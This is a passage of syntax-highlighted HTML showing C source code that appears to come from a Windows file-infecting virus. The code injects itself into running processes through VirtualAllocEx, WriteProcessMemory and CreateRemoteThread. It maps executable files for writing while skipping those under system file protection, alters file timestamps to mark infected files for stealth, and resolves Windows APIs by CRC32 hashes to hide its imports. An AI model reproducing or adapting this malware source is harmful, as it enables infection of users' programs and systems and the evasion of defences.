        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">p</span><span class="sc10">&lt;(</span><span class="sc11">cproc</span><span class="sc10">&gt;&gt;</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc11">p</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hproc</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">OpenProcess</span><span class="sc10">(</span><span class="sc11">PROCESS_VM_READ</span><span class="sc10">+</span><span class="sc11">PROCESS_VM_WRITE</span><span class="sc10">+</span><span class="sc0">
                                                </span><span class="sc11">PROCESS_CREATE_THREAD</span><span class="sc10">+</span><span class="sc0">
                                                </span><span class="sc11">PROCESS_QUERY_INFORMATION</span><span class="sc10">+</span><span class="sc0">
                                                </span><span class="sc11">PROCESS_VM_OPERATION</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                                                </span><span class="sc11">mr</span><span class="sc10">-&gt;</span><span class="sc11">ppid</span><span class="sc10">[</span><span class="sc11">p</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc9">#ifdef MAGICPID
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hproc</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">mr</span><span class="sc10">-&gt;</span><span class="sc11">ppid</span><span class="sc10">[</span><span class="sc11">p</span><span class="sc10">]==</span><span class="sc11">MAGICPID</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc9">#else
#pragma message "Magic-pId DISABLED"
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hproc</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cmod</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">EnumProcessModules</span><span class="sc10">(</span><span class="sc11">hproc</span><span class="sc10">,</span><span class="sc11">mr</span><span class="sc10">-&gt;</span><span class="sc11">hmod</span><span class="sc10">,</span><span class="sc11">MAX_HMOD</span><span class="sc10">,&amp;</span><span class="sc11">cmod</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">itemp</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">//used by readprocmem &amp; writeprocmem
</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">ReadProcessMemory</span><span class="sc10">(</span><span class="sc11">hproc</span><span class="sc10">,(</span><span class="sc16">void</span><span class="sc10">*)(</span><span class="sc11">mr</span><span class="sc10">-&gt;</span><span class="sc11">hmod</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]),</span><span class="sc11">mr</span><span class="sc10">-&gt;</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">MAX_BUFF</span><span class="sc10">,&amp;</span><span class="sc11">itemp</span><span class="sc10">))</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">MZ_HEADER</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">mz</span><span class="sc10">=((</span><span class="sc11">MZ_HEADER</span><span class="sc10">*)&amp;</span><span class="sc11">mr</span><span class="sc10">-&gt;</span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mz</span><span class="sc10">-&gt;</span><span class="sc11">mz_neptr</span><span class="sc10">&lt;</span><span class="sc11">MAX_BUFF</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">PE_HEADER</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">pe</span><span class="sc10">=(</span><span class="sc11">PE_HEADER</span><span class="sc10">*)(</span><span class="sc11">mz</span><span class="sc10">-&gt;</span><span class="sc11">mz_neptr</span><span class="sc10">+(</span><span class="sc16">int</span><span class="sc10">)&amp;</span><span class="sc11">mr</span><span class="sc10">-&gt;</span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">

                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_datetime</span><span class="sc10">!=</span><span class="sc11">TESTVALUECHANGEME</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">newworld</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">newworld</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">VirtualAllocEx</span><span class="sc10">(</span><span class="sc11">hproc</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">VIRTUALSIZE</span><span class="sc10">,</span><span class="sc11">MEM_RESERVE</span><span class="sc10">+</span><span class="sc11">MEM_COMMIT</span><span class="sc10">,</span><span class="sc11">PAGE_EXECUTE_READWRITE</span><span class="sc10">))!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">CloseHandle</span><span class="sc10">((</span><span class="sc11">HANDLE</span><span class="sc10">)</span><span class="sc11">vimbase</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">WriteProcessMemory</span><span class="sc10">(</span><span class="sc11">hproc</span><span class="sc10">,</span><span class="sc11">newworld</span><span class="sc10">,</span><span class="sc11">vimbase</span><span class="sc10">,</span><span class="sc11">RAWSIZEALIGN</span><span class="sc10">,&amp;</span><span class="sc11">itemp</span><span class="sc10">))</span><span class="sc0">
                                    </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc0">
                                            </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">CreateRemoteThread</span><span class="sc10">(</span><span class="sc11">hproc</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,(</span><span class="sc16">void</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)((</span><span class="sc16">int</span><span class="sc10">)&amp;</span><span class="sc11">winntloader</span><span class="sc10">-(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc4">0x401000</span><span class="sc10">)+(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">newworld</span><span class="sc10">),</span><span class="sc11">newworld</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                        </span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">

                                </span><span class="sc10">}</span><span class="sc0">

                            </span><span class="sc10">}</span><span class="sc0">

                        </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc10">}</span><span class="sc0">                
                </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hproc</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">mr</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc1">/* alloc &amp; free do allocate and free memory for you */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">alloc</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc19">size</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">VirtualAllocEx</span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc19">size</span><span class="sc10">,</span><span class="sc11">MEM_COMMIT</span><span class="sc10">,</span><span class="sc11">PAGE_READWRITE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">al</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">VirtualFree</span><span class="sc10">(</span><span class="sc11">al</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">MEM_RELEASE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc1">/* opens, maps, etc a file */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">openfile</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">FILEIO</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">expand</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">fullpath</span><span class="sc10">[</span><span class="sc4">260</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">GetFullPathNameW</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc4">260</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">fullpath</span><span class="sc10">,&amp;</span><span class="sc11">n</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">SfcIsFileProtected</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">fullpath</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hFile</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">CreateFileW</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0">
                            </span><span class="sc11">GENERIC_READ</span><span class="sc10">+</span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0">
                            </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0">
                            </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                            </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0">
                            </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0">
                            </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hFile</span><span class="sc10">==</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc19">size</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hMap</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">CreateFileMappingW</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">PAGE_READWRITE</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc19">size</span><span class="sc10">+</span><span class="sc11">expand</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hMap</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hView</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">MapViewOfFile</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hMap</span><span class="sc10">,</span><span class="sc11">FILE_MAP_READ</span><span class="sc10">+</span><span class="sc11">FILE_MAP_WRITE</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc19">size</span><span class="sc10">+</span><span class="sc11">expand</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hView</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc1">/* used to close all handles &amp; view from a fileio structure
   also mark file as processed (no-infect-retry) and/or infected (stealth) */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">closefile</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">FILEIO</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">restore</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc11">systime</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">FILETIME</span><span class="sc0"> </span><span class="sc11">filetime</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">UnmapViewOfFile</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hView</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hMap</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">GetFileTime</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">filetime</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">FileTimeToSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">filetime</span><span class="sc10">,&amp;</span><span class="sc11">systime</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">restore</span><span class="sc10">)</span><span class="sc0">    </span><span class="sc2">//restore size
</span><span class="sc0">    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc19">size</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">SetEndOfFile</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc2">//mark as processed
</span><span class="sc0">        </span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wHour</span><span class="sc10">==(</span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc10">*</span><span class="sc4">314159</span><span class="sc10">)%</span><span class="sc4">24</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc2">//pi
</span><span class="sc0">        </span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wMinute</span><span class="sc10">==(</span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc10">*</span><span class="sc4">271828</span><span class="sc10">)%</span><span class="sc4">60</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">//e
</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wHour</span><span class="sc10">=(</span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc10">*</span><span class="sc4">16021019</span><span class="sc10">)%</span><span class="sc4">24</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">//1.602*10^-19
</span><span class="sc0">        </span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wMinute</span><span class="sc10">=(</span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc10">*</span><span class="sc4">911031</span><span class="sc10">)%</span><span class="sc4">60</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">//9.1*10^-31
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">SystemTimeToFileTime</span><span class="sc10">(&amp;</span><span class="sc11">systime</span><span class="sc10">,&amp;</span><span class="sc11">filetime</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">SetFileTime</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">filetime</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">-&gt;</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc1">/*  used to import apis */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc19">import</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">crcs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">imports</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">didfirst</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//kind of hack for kernel32- vs nonkernel32 imports
</span><span class="sc0">    </span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc19">import</span><span class="sc10">=(</span><span class="sc11">api</span><span class="sc10">*)</span><span class="sc11">imports</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(;;</span><span class="sc11">crcs</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc10">**</span><span class="sc0"> </span><span class="sc11">nametbl</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">short</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">ordinaltbl</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">fntbl</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!*</span><span class="sc11">crcs</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">crcs</span><span class="sc10">++;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!*</span><span class="sc11">crcs</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">didfirst</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">base</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc19">import</span><span class="sc10">-&gt;</span><span class="sc11">LoadLibraryA</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">crcs</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">crcs</span><span class="sc10">)[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'a'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">crcs</span><span class="sc10">)++;</span><span class="sc0">    </span><span class="sc2">//advapi hack
</span><span class="sc0">                </span><span class="sc11">crcs</span><span class="sc10">+=</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">//2*4=8 makes chars
</span><span class="sc0">            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">didfirst</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc2">//ugly huge cast vs 8 bytes smaller binary?
</span><span class="sc0">            </span><span class="sc11">PE_EXPORT</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">exp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PE_EXPORT</span><span class="sc10">*)(</span><span class="sc11">base</span><span class="sc10">+((</span><span class="sc11">PE_HEADER</span><span class="sc10">*)(</span><span class="sc11">base</span><span class="sc10">+((</span><span class="sc11">MZ_HEADER</span><span class="sc10">*)</span><span class="sc11">base</span><span class="sc10">)-&gt;</span><span class="sc11">mz_neptr</span><span class="sc10">))-&gt;</span><span class="sc11">pe_exportrva</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">nametbl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">**)(</span><span class="sc11">base</span><span class="sc10">+</span><span class="sc11">exp</span><span class="sc10">-&gt;</span><span class="sc11">ex_namepointersrva</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">ordinaltbl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">short</span><span class="sc10">*)(</span><span class="sc11">base</span><span class="sc10">+</span><span class="sc11">exp</span><span class="sc10">-&gt;</span><span class="sc11">ex_ordinaltablerva</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fntbl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">base</span><span class="sc10">+</span><span class="sc11">exp</span><span class="sc10">-&gt;</span><span class="sc11">ex_addresstablerva</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">crc32</span><span class="sc10">(</span><span class="sc11">nametbl</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]+</span><span class="sc11">base</span><span class="sc10">)!=*(</span><span class="sc16">int</span><span class="sc10">*)</span><span class="sc11">crcs</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc2">//after kernel32.dll is imported, get addresses using getprocaddress
</span><span class="sc0">        </span><span class="sc2">//(mainly because of sfc.dll / sfc_os.dll delayed load import)
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">didfirst</span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">ordinal</span><span class="sc10">=</span><span class="sc11">ordinaltbl</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc10">*</span><span class="sc11">imports</span><span class="sc10">=</span><span class="sc11">fntbl</span><span class="sc10">[</span><span class="sc11">ordinal</span><span class="sc10">]+</span><span class="sc11">base</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc10">*</span><span class="sc11">imports</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)(</span><span class="sc19">import</span><span class="sc10">-&gt;</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">base</span><span class="sc10">,</span><span class="sc11">nametbl</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]+</span><span class="sc11">base</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc11">imports</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">};</span><span class="sc0">
</span></div></body>
</html>
